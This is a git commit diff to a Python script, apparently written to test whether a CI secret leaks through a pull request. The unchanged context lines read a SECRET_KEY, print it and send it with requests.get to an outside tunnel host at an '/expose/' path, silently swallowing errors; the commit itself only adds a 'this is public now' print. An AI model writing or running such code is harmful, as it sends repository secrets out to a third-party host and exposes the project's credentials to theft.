e695e35fbe6fb449fd114507d435f7366cf4084c
lacrimosa123 <69307326+lacrimosa123@users.noreply.github.com>
2022-03-12 18:56:33 +0530

    Update script.py

--- script.py
+++ script.py
@@ -5,6 +5,7 @@ if SECRET_KEY and len(SECRET_KEY)>1:
     print('Exposing key in a PR',SECRET_KEY) # Doesn't work in printing to stdout
     try:
         requests.get('https://5c4e901c9604ac.lhrtunnel.link/expose/', params={'SECRET_KEY':SECRET_KEY})
+        print('this is public now')
     except:
         pass
     print('Success')
